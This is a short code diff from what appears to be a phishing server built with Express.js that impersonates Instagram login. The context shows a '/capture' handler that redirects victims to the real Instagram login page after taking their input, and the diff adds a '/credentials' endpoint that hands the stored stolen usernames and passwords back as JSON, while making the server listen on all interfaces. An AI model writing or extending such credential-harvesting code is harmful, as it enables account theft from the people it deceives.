@@ -28,12 +28,11 @@ app.post("/capture", (req, res) => {
   res.redirect("https://www.instagram.com/accounts/login/");
 });
 
+// Endpoint to get captured credentials
+app.get("/credentials", (req, res) => {
+  res.json(capturedCredentials); // Send the credentials as JSON response
+});
+
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Server is running on http://0.0.0.0:${PORT}`);
 });
-
-
-// Start the server
-// app.listen(PORT, () => {
-//   console.log(`Server is running on http://localhost:${PORT}`);
-// });
